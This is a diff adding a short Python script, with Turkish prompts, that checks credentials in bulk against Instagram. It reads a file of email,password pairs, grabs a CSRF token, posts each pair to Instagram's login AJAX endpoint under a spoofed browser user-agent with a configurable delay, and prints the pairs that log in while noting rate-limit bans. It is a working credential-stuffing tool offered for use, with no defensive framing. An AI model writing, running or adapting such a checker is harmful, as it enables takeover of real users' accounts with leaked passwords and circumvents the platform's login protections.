@@ -1,0 +1,60 @@
+import requests
+import socket
+import re
+import time
+from datetime import datetime
+
+
+print ("Dosyayı Sec")
+a = input()
+print ("Delay giriniz 1 delay=1 saniye ")
+try:
+    b = int(input())
+except:
+    print("düzgün gir mk")
+try:
+    dosya = open(a,"r")
+except FileNotFoundError:
+    print("DOSYA LOKASYONU VEYAHUT UZANTIDA HATA VAR")
+except OSError:
+    print("DÜZGÜN YAZ LOKASYONU")
+url = "https://www.instagram.com/accounts/login/"
+login_url = "https://www.instagram.com/accounts/login/ajax/"
+saat = int(datetime.now().timestamp())
+satir = 0
+for i in dosya:
+    nokta = 0
+    satir = satir + 1
+    nokta = i.find(",")
+    mail = i[0:nokta]
+    pasw = i[nokta+1:-1]
+    liste = {
+    'username': mail,
+    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{saat}:{pasw}', 
+    'queryParams': {},
+    'optIntoOneTap': 'false'
+    }
+    with requests.Session() as t:
+        time.sleep(b)
+        r = t.get(url)
+        cs = re.findall(r"csrf_token\":\"(.*?)\"",r.text)[0]
+        r = t.post(login_url,data=liste,headers={
+            "user-agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
+            
+            "x-requested-with": "XMLHttpRequest",
+            "referer": "https://www.instagram.com/accounts/login/",
+            "x-csrftoken":cs
+    }
+                   )
+        veri = r.text.find("userId")
+        uyari = r.text.find("wait")
+        """
+        print(r.text)
+        """
+        if (veri > 1):
+            print(satir,mail,pasw)
+           
+        elif (uyari > 1):
+            print (satir,"ban yedi")
+        else:
+            print (satir,"hesap yok")
